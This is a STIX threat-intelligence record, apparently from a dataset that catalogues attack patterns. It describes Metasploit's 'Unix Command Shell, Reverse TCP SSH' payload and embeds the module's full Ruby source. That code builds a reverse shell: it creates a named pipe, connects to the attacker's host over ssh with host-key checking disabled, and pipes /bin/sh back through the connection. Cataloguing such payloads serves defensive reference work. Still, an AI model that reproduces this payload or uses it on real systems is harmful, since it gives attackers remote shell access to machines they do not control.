{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6306cbb3-0adc-400b-8bfc-9f893aed12f7",
    "created": "2024-08-14T16:33:19.313261Z",
    "modified": "2024-08-14T16:33:19.313264Z",
    "name": "Unix Command Shell, Reverse TCP SSH",
    "description": "Connect back and create a command shell via SSH",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_ssh.rb",
            "external_id": "reverse_ssh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'msf/core/handler/reverse_ssh'\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Reverse TCP SSH',\n     'Description' => 'Connect back and create a command shell via SSH',\n     'Author'      => [\n       'RageLtMan <rageltman[at]sempervictus>', # Rex/Metasploit\n       'hirura' # HrrRbSsh\n     ],\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::ReverseSsh,\n     'Session'     => Msf::Sessions::SshCommandShellReverse,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'ssh',\n     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n    register_advanced_options(\n      [\n        Msf::OptString.new('SshClientOptions', [\n          false,\n          \"Space separated options for the ssh client\",\n          'UserKnownHostsFile=/dev/null StrictHostKeyChecking=no'\n        ]),\n        OptString.new('SSHPath', [true, 'The path to the SSH executable', 'ssh']),\n        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    backpipe = Rex::Text.rand_text_alpha_lower(4..8)\n    lport = datastore['LPORT'] == 22 ? '' : \"-p #{datastore['LPORT']} \"\n    opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = \"-o #{e} \" }.join\n    \"mkfifo /tmp/#{backpipe};#{datastore['SSHPath']} -qq #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|#{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}